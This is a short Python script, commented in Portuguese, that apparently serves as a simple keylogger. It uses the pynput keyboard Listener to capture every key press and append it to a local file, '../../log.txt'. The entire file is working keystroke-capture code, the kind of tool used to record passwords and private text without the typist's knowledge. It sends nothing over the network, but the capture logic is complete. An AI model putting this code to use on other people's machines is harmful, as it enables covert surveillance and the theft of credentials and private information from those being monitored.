from pynput.keyboard import Listener
logFile = "../../log.txt"

def writeLog(key):
    '''
    Esta função será responsável por receber a tecla pressionada
    via Listener e escrever no arquivo de log
    '''

    #converter a tecla pressionada para string
    keydata = str(key)

    #abrir o arquivo de log no modo append
    with open(logFile, "a") as f:
        f.write(keydata)
        f.write('\n')

#abrir o Listener do teclado e escutar o evento on_press
#quando o evento on_press ocorrer, chamar a função writeLog
with Listener(on_press=writeLog) as l:
    l.join()